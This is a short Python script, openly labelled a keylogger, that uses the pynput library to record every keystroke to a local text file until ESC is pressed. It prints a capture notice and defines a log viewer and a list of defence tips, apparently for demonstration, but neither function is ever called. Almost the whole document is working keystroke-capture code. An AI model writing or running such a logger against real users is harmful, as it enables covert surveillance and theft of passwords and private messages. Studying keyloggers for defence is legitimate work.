#Keylogger Script
# This script captures keystrokes and logs them to a file.
from pynput.keyboard import Key, Listener
import os
from datetime import datetime

log_file = "key_log.txt"

# Write the keys to the log file
def write_to_file(key):
    with open(log_file, "a") as file:
        try:
            k = str(key).replace("'", "")  # Clean the key format
            if k == "Key.space":
                file.write(" ")  # Write space for space key
            elif k == "Key.enter":
                file.write("\n")  # Newline for Enter key
            elif k.find("Key") == -1:  # Regular keys
                file.write(k)
            else:
                file.write(f"[{k}]")  # Handle special keys like shift, ctrl, etc.
        except AttributeError:
            # Catch any unexpected key type and log it
            print(f"Error capturing key: {key}")

# Callback for key press
def on_press(key):
    write_to_file(key)

# Callback for key release (stop on 'ESC')
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener when 'ESC' is pressed

# Start listening to keystrokes
try:
    print("Keystrokes are being captured...")  # Notify user
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    pass
except Exception as e:
    print(f"\n Unexpected error: {e}")


# Show captured logs (useful for testing)
def show_logs():
    if os.path.exists(log_file):
        with open(log_file, "r") as file:
            print("Captured keystrokes:")
            print(file.read())
    else:
        print("No logs found")

# Display defense tips
def display_tips():
    print("\n### Defense Tips ###")
    print("- Install and update antivirus software.")
    print("- Use multi-factor authentication.")
    print("- Avoid unknown USB drives or attachments.")
    print("- Regularly check and update your OS and applications.")
